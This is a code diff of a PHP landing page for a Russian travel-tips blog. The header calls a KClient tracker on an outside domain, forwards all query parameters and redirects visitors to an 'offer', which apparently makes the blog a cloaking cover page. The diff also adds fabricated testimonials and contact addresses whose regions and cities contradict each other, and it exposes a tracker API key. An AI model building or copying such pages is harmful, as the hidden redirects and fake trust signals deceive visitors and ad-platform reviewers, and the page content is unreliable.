@@ -2,7 +2,7 @@
 // Query params are: undefined 
 
 require_once dirname(__FILE__) . '/kclient.php';
-$client = new KClient('https://traveling-news.ru/', '8nJsFpZTzwDpqxP1');
+$client = new KClient('https://traveling-actual.ru/', 'zm546PCsfpWB7GCb');
 $client->sendAllParams();       // to send all params from page query
 $client->forceRedirectOffer();       // redirect to offer if an offer is chosen
 // $client->param('sub_id_5', '123'); // you can send any params
@@ -17,80 +17,78 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <!-- basic -->
     <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <!-- mobile metas -->
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="viewport" content="initial-scale=1, maximum-scale=1" />
-    <!-- site metas -->
      
     <title>Главная</title>
-    <!-- bootstrap css -->
-    <link rel="stylesheet" href="css/bootstrap.min.css" />
-    <!-- style css -->
-    <link rel="stylesheet" href="css/style.css" />
-    <!-- Responsive-->
-    <link rel="stylesheet" href="css/responsive.css" />
-    <!-- fevicon -->
-    <link rel="icon" href="images/fevicon.png" type="image/gif" />
-    <!-- Scrollbar Custom CSS -->
-    <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="css/materialdesignicons.min.css" />
+    <link rel="stylesheet" type="text/css" href="css/style.css" />
   </head>
-  <!-- body -->
 
-  <body class="main-layout">
-    <!-- loader  -->
-    <div class="loader_bg">
-      <div class="loader"><img src="images/loading.gif" alt="#" /></div>
-    </div>
-    <!-- end loader -->
-    <!-- header -->
-    <header id="home">
-      <!-- header inner -->
-      <div class="header">
-        <div class="container">
-          <div class="row">
-            <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
-              <div class="full">
-                <div class="center-desk">
-                  <div class="logo">
-                   
-                  </div>
-                </div>
-              </div>
-            </div>
-            <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
-              <div class="menu-area">
-                <div class="limit-box">
-                  <nav class="main-menu">
-                    <ul class="menu-area-main">
-                      <li class="active"><a href="index.php">Главная</a></li>
-                      <li><a href="blog.php">Статьи</a></li>
-                      <li><a href="contact.php">Контакты</a></li>
-                      <li><a href="policy.php">Политика конфиденциальности</a></li>
-                      <li><a href="terms.php">Условия и положения</a></li>
-                    </ul>
-                  </nav>
+  <body data-bs-spy="scroll" data-bs-target="#navbar" data-bs-offset="71">
+    <!--Navbar Start-->
+    <nav class="navbar navbar-expand-lg fixed-top navbar-custom sticky sticky-dark" id="navbar">
+      <div class="container">
+        <!-- LOGO -->
+        <a class="navbar-brand logo" href="index.php"> Поиски Одиссеи </a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarCollapse"
+          aria-controls="navbarCollapse"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <i class="mdi mdi-menu"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+          <ul class="navbar-nav ms-auto navbar-center" id="mySidenav">
+            <li class="nav-item"><a class="nav-link" href="index.php">Главная</a></li>
+            <li class="nav-item">
+              <a class="nav-link" href="blog.php">Статьи</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="contact.php">Контакты</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="privacy.php">Политика конфиденциальности</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="terms.php">Условия и положения</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+    <!-- Navbar End -->
+
+    <!-- START SOFTWERE-HOME -->
+    <section class="softwere-home" id="home" style="background-image: url('./assets/images/bulksplash-opeleye-kjkrwgnn2bi.jpg')">
+      <div class="bg-overlay"></div>
+      <div class="home-center">
+        <div class="home-desc-center">
+          <div class="container">
+            <div class="row align-items-center">
+              <div class="col-lg-6">
+                <div class="softwere-home-content text-white mt-4">
+                  <h4 class="softwere-home-title text-uppercase line-height_1_4 letter-spacing_4">
+                    Популярные
+                  </h4>
                 </div>
               </div>
             </div>
           </div>
-        </div>
-      </div>
-      <!-- end header inner -->
-    </header>
-    <!-- end header -->
 
-    <section class="slider_section" style="overflow: hidden">
-      <div class="container">
-        <div class="row">
-          <div class="col-md-6">
-            <div class="full">
-              <h1><strong class="cur">Популярные</strong></h1>
-
-              <div class="button_section">
-                <a class="main_bt" href="blog.php">Статьи</a>
+          <div class="container-fluid">
+            <div class="row">
+              <div class="softwere-home-shape-img">
+                <img
+                  src="images/home-softwere-shape.png"
+                  alt=""
+                  class="img-fluid mx-auto d-block"
+                />
               </div>
             </div>
           </div>
@@ -98,76 +96,226 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
       </div>
     </section>
 
-    <!-- section -->
-    <div id="blog" class="section dark_bg layout_padding right_white mt-5 mb-5">
+    <!-- START TESTIMONIAL -->
+    <section class="section testimonial" id="client">
       <div class="container">
-        <div class="row">
-          <div class="col-md-12">
-            <div class="heading full text_align_center">
-              <h2 class="white_font full text_align_center">Статьи</h2>
+        <div class="row justify-content-center">
+          <div class="col-lg-8">
+            <div class="text-center">
+              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
+                Отзывы
+              </h2>
             </div>
           </div>
         </div>
-        <div class="row">
+
+        <div class="row mt-5 pt-3">
+          <div class="col-lg-12">
+            <div id="agency-owl-demo">
+              <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
+                <div class="carousel-inner">
+                  
+                  <div class="carousel-item active">
+                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
+                      <div class="agency-testi-desc bg-white">
+                        <p class="text-muted f-17 mb-0">Сайт - отличное место, чтобы открыть для себя новые точки зрения на проблемы. Это отличный способ бросить вызов своим собственным убеждениям.</p>
+                      </div>
+
+                      <div class="agency-testimonial-img mt-5 pt-3">
+                        <img
+                          src="./assets/images/avatar_16669583958028.jpeg"
+                          class="img-fluid rounded-circle"
+                          alt=""
+                          style="height: 80px; object-fit: cover"
+                        />
+                        <div class="mt-4">
+                          <h5 class="text-uppercase f-15 letter-spacing_2">Доктор Эфраин Штамм</h5>
+                          <p class="text-muted f-13 mb-0"></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+ 
+                  <div class="carousel-item">
+                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
+                      <div class="agency-testi-desc bg-white">
+                        <p class="text-muted f-17 mb-0">Мне нравится, как сайт предоставляет глобальный взгляд на проблемы. Важно понимать, как разные страны подходят к различным вопросам.</p>
+                      </div>
+
+                      <div class="agency-testimonial-img mt-5 pt-3">
+                        <img
+                          src="./assets/images/avatar_16669580077194.jpeg"
+                          class="img-fluid rounded-circle"
+                          alt=""
+                          style="height: 80px; object-fit: cover"
+                        />
+                        <div class="mt-4">
+                          <h5 class="text-uppercase f-15 letter-spacing_2">Мистер Амос Манн</h5>
+                          <p class="text-muted f-13 mb-0"></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+
+                  <div class="carousel-item">
+                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
+                      <div class="agency-testi-desc bg-white">
+                        <p class="text-muted f-17 mb-0">Я действительно ценю вашу работу. Сайт предлагает очень интересные темы и статьи, которые мне действительно нравятся.</p>
+                      </div>
+
+                      <div class="agency-testimonial-img mt-5 pt-3">
+                        <img
+                          src="./assets/images/avatar_16669571024610.jpeg"
+                          class="img-fluid rounded-circle"
+                          alt=""
+                          style="height: 80px; object-fit: cover"
+                        />
+                        <div class="mt-4">
+                          <h5 class="text-uppercase f-15 letter-spacing_2">Рузвельт Мюррей II</h5>
+                          <p class="text-muted f-13 mb-0"></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+
+                  <div class="carousel-item">
+                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
+                      <div class="agency-testi-desc bg-white">
+                        <p class="text-muted f-17 mb-0">Статьи на этом сайте написаны экспертами в своих соответствующих областях, поэтому вы всегда можете доверять информации, которую получаете.</p>
+                      </div>
+
+                      <div class="agency-testimonial-img mt-5 pt-3">
+                        <img
+                          src="./assets/images/avatar_16669586371769.jpeg"
+                          class="img-fluid rounded-circle"
+                          alt=""
+                          style="height: 80px; object-fit: cover"
+                        />
+                        <div class="mt-4">
+                          <h5 class="text-uppercase f-15 letter-spacing_2">Руби Виндлер</h5>
+                          <p class="text-muted f-13 mb-0"></p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+
+                </div>
+                <button
+                  class="carousel-control-prev"
+                  type="button"
+                  data-bs-target="#carouselExampleControls"
+                  data-bs-slide="prev"
+                >
+                  <i class="mdi mdi-menu-left"></i>
+                </button>
+                <button
+                  class="carousel-control-next"
+                  type="button"
+                  data-bs-target="#carouselExampleControls"
+                  data-bs-slide="next"
+                >
+                  <i class="mdi mdi-menu-right"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- END TESTIMONIAL -->
+
+    <!-- START BLOG -->
+    <section class="section blog" id="news">
+      <div class="container">
+        <div class="row justify-content-center">
+          <div class="col-lg-8">
+            <div class="text-center">
+              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
+                Статьи
+              </h2>
+            </div>
+          </div>
+        </div>
+
+        <div class="row mt-5 pt-3">
           
-          <div class="col-md-4 margin_top_30">
-            <div class="full" style="overflow: hidden">
-              <div class="full bl">
+          <div class="col-lg-4">
+            <div class="mt-4">
+              <div>
                 <img
-                  class="img-responsive"
-                  src="./assets/images/bulksplash-harleydavidson-bs1eqd6zsiu.jpg"
-                  alt="#"
-                  style="max-height: 200px; width: 100%; object-fit: cover"
+                  src="./assets/images/bulksplash-opeleye-kjkrwgnn2bi.jpg"
+                  style="width: 100%; height: 240px; object-fit: cover"
+                  class="img-fluid"
+                  alt=""
                 />
               </div>
-              <div class="full blog_blue text_align_center">
-                <h5 class="white_font">Важные советы путешественн...</h5>
-                <p><strong></strong>Путешествие в первый раз может быть как захватывающим, так и пугающим. Вы...</p>
-                <a class="main_bt" href="8A41LJzmnxoujQezOXbqT0hAomj24.php" style="width: 100%"
-                  >Читать далее</a
-                >
+              <div class="bg-white p-4">
+                <div class="agency-blog-info">
+                  <h5 class="f-16 line-height_1_6">
+                    <a href="9388defd33ebce4dd9f8b37c3847d409.php">10 основных совет...</a>
+                  </h5>
+                  <div class="mt-3">
+                    <a href="9388defd33ebce4dd9f8b37c3847d409.php" class="more-details text-uppercase text-muted fw-bold f-12"
+                      >Читать далее <i class="mdi mdi-arrow-right"></i
+                    ></a>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
           
 
-          <div class="col-md-4 margin_top_30">
-            <div class="full" style="overflow: hidden">
-              <div class="full bl">
+          <div class="col-lg-4">
+            <div class="mt-4">
+              <div>
                 <img
-                  class="img-responsive"
-                  src="./assets/images/bulksplash-sanleesnaps-g9uimpd3fuw.jpg"
-                  alt="#"
-                  style="max-height: 200px; width: 100%; object-fit: cover"
+                  src="./assets/images/bulksplash-alicekat-z9f_yk4nmf8.jpg"
+                  style="width: 100%; height: 240px; object-fit: cover"
+                  class="img-fluid"
+                  alt=""
                 />
               </div>
-              <div class="full blog_blue text_align_center">
-                <h5 class="white_font">Основные советы путешестве...</h5>
-                <p><strong></strong> Планирование поездки может оказаться непростой задачей, особенно если ...</p>
-                <a class="main_bt" href="973862686a42fd2fd545b7e8ca802f3c.php" style="width: 100%"
-                  >Читать далее</a
-                >
+              <div class="bg-white p-4">
+                <div class="agency-blog-info">
+                  <h5 class="f-16 line-height_1_6">
+                    <a href="baa47e9101471c8a6dd7830a5d895ed0.php">Основные советы ...</a>
+                  </h5>
+                  <div class="mt-3">
+                    <a href="baa47e9101471c8a6dd7830a5d895ed0.php" class="more-details text-uppercase text-muted fw-bold f-12"
+                      >Читать далее <i class="mdi mdi-arrow-right"></i
+                    ></a>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
           
 
-          <div class="col-md-4 margin_top_30">
-            <div class="full" style="overflow: hidden">
-              <div class="full bl">
+          <div class="col-lg-4">
+            <div class="mt-4">
+              <div>
                 <img
-                  class="img-responsive"
-                  src="./assets/images/bulksplash-1v4n4-ngzk9t20kou.jpg"
-                  alt="#"
-                  style="max-height: 200px; width: 100%; object-fit: cover"
+                  src="./assets/images/bulksplash-alexforestier-klfdghxogpm.jpg"
+                  style="width: 100%; height: 240px; object-fit: cover"
+                  class="img-fluid"
+                  alt=""
                 />
               </div>
-              <div class="full blog_blue text_align_center">
-                <h5 class="white_font">Важные советы путешественн...</h5>
-                <p><strong></strong>Путешествие может быть непростым опытом для начинающих, но при правильн...</p>
-                <a class="main_bt" href="60e87393eac585287d64d7ced596c266.php" style="width: 100%"
-                  >Читать далее</a
-                >
+              <div class="bg-white p-4">
+                <div class="agency-blog-info">
+                  <h5 class="f-16 line-height_1_6">
+                    <a href="y0a9YHnD0qVRGq6m4BKcB3FH.php">Основные советы ...</a>
+                  </h5>
+                  <div class="mt-3">
+                    <a href="y0a9YHnD0qVRGq6m4BKcB3FH.php" class="more-details text-uppercase text-muted fw-bold f-12"
+                      >Читать далее <i class="mdi mdi-arrow-right"></i
+                    ></a>
+                  </div>
+                </div>
               </div>
             </div>
           </div>
@@ -175,55 +323,76 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
 
         </div>
       </div>
-    </div>
-    <!-- end section -->
+    </section>
+    <!-- END BLOG -->
 
-    <!-- footer -->
-    <footer>
-      <div class="footer layout_padding">
-        <div class="container">
-          <div class="row">
-            <div class="col-lg-12 col-md-12 col-sm-12 text-center">
-              <h3>Контакты</h3>
-              <p>639130, Новосибирская область, город Орехово-Зуево, шоссе Балканская, 77</p>
-              <p>+7348916599043</p>
-              <p>olga57@rambler.ru</p>
+    <!-- START CONTACT -->
+    <section class="section agency-contact" id="contact">
+      <div class="container">
+        <div class="row justify-content-center">
+          <div class="col-lg-8">
+            <div class="text-center">
+              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
+                Контакты
+              </h2>
+            </div>
+          </div>
+        </div>
+
+        <div class="row mt-5 pt-3 align-items-center">
+          <div class="col-lg-12 text-center">
+            <div class="mt-4">
+              <div
+                style="
+                  background-image: url('images/map.png');
+                  background-repeat: no-repeat;
+                  background-size: cover;
+                  background-position: center;
+                "
+                class="pb-3"
+              >
+                <div class="mt-3">
+                  <div class="agency-contact-info ps-4">
+                    <p class="text-muted">apollon33@mail.ru</p>
+                  </div>
+                </div>
+                <div class="mt-3">
+                  <div class="agency-contact-info ps-4">
+                    <p class="text-muted">992490, Томская область, город Подольск, бульвар Косиора, 29</p>
+                  </div>
+                </div>
+                <div class="mt-3">
+                  <div class="agency-contact-info ps-4">
+                    <p class="text-muted">+5815041230831</p>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
         </div>
       </div>
-      <div class="copyright">
-        <div class="container">
-          <p>
-            ©
-            <script>
-              document.write(new Date().getFullYear());
-            </script>
-            Copyright
-          </p>
+    </section>
+    <!-- END CONTACT -->
+
+    <!-- START FOOTER -->
+    <footer class="section-footer bg-softwere-footer">
+      <div class="container">
+        <div class="row mt-4 py-4">
+          <div class="col-lg-12">
+            <div class="text-center">
+              <p class="copy-rights text-white mb-0">
+                ©
+                <script>
+                  document.write(new Date().getFullYear());
+                </script>
+                Copyright
+              </p>
+            </div>
+          </div>
         </div>
       </div>
     </footer>
-    <!-- end footer -->
-
-    <div class="cookie-banner">
-      <p style="color: #000000">
-        Сайт использует файлы cookie. Они позволяют узнавать вас и получать информацию о вашем пользовательском опыте.Продолжая просмотр сайта, я соглашаюсь с использованием файлов cookie владельцем сайта в соответствии с
-        <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie"
-          >Политикой cookie</a
-        >
-      </p>
-
-      <button class="close-cookie">×</button>
-    </div>
-
-    <script>
-      window.onload = function () {
-        $('.close-cookie').click(function () {
-          $('.cookie-banner').fadeOut();
-        });
-      };
-    </script>
+    <!-- END FOOTER -->
 
     <script>
       let elems = document.querySelectorAll('.server-name');
@@ -231,15 +400,8 @@ $client->executeAndBreak();     // to stop page execution if there is redirect o
         elem.innerHTML = window.location.hostname;
       });
     </script>
-    <!-- Javascript files-->
-    <script src="js/jquery.min.js"></script>
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.bundle.min.js"></script>
-    <script src="js/jquery-3.0.0.min.js"></script>
-    <script src="js/plugin.js"></script>
 
-    <!-- sidebar -->
-    <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
-    <script src="js/custom.js"></script>
+    <script src="js/script.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script>
   </body>
 </html>
